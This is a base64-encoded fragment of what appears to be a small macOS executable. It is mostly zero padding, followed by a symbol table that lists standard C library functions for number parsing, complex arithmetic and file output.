AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAFAAAACAAAAACwAAAAEAAAAAAAAAAAAAAAQAAAAAAAAAAAAAABgAAAAAAAAAAAAAABgAAAAAQAYAAEAAAAAAAAAAAAAAAQAAAAECAAABFgAAASwAAAE4AAABRAAAAVAAAAFcAAABbAAAAXoAAAGMAAABmgAAAAAAAABfX19tdWxkYzMAX19fc3RkZXJycABfYXRvZgBfYXRvaQBfY2FicwBfZXhpdABfZmNsb3NlAF9mb3BlbgBfZnByaW50ZgBfZnB1dGMAX2Z3cml0ZQAAAAAAAV9fbWhfZXhlY3V0ZV9oZWFkZXIAFwIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC0bJwByAHAAWDIBwAAAAAAbAAAADwAAABCRWEFAAAAAAQAAAAPARAAAAAAAAEAAAAYAAAAAQAAAQAAAAAAAAAAIgAAAAEAAAEAAAAAAAAAAC0AAAABAAABAAAAAAAAAAAzAAAAAQAAAQAAAAAAAAAAOQAAAAEAAAEAAAAAAAAAAD8AAAABAAABAAAAAAAAAABFAAAAAQAAAQAAAAAAAAAATQAAAAEAAAEAAAAAAAAAAFQAAAABAAABAAAAAAAAAABdAAAAAQAAAQAAAAAAAAAAZAAAAAEAAAEAAAAAAAAAAAIAAAAEAAAABQAAAAYAAAAHAAAACAAAAAkAAAAKAAAACwAAAAwAAAACAAAAAwAAAAQAAAAFAAAABgAAAAcAAAAIAAAACQAAAAoAAAALAAAADAAAAAAAAAAAAAAAX19taF9leGVjdXRlX2hlYWRlcgBfX19tdWxkYzMAX19fc3RkZXJycABfYXRvZgBfYXRvaQBfY2FicwBf